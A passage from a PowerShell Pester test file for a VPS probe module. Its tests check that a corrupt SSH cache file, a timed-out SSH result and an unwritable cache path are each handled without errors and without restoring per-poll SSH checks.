    It 'a corrupt (unparseable) cache file is discarded, the SSH leg runs again, nothing throws' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        Set-Content -LiteralPath $cacheFilePath -Value '{ this is not valid json'

        { Invoke-Probe -Config $config } | Should -Not -Throw
        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'an all-unknown (timed-out) SSH result -- UnitStates AND PortState both unresolved -- is cached like any other completed result -- a sustained SSH failure cannot restore a hot per-poll cadence' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck -IngestState $null -YouTubeLvState $null -YouTubeRuState $null -PortState $null -Detail 'ssh probe timed out'

        $stateFilePath = Join-Path (New-VpsThrottleTestStateDirectory) 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        Invoke-Probe -Config $config | Out-Null
        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'a cache write failure (unwritable parent path) never throws out of the probe' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $blockingFilePath = Join-Path (New-VpsThrottleTestStateDirectory) 'not-a-directory'
        Set-Content -LiteralPath $blockingFilePath -Value 'blocker'
        $stateFilePath = Join-Path $blockingFilePath 'state\offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        { Invoke-Probe -Config $config } | Should -Not -Throw
    }
}
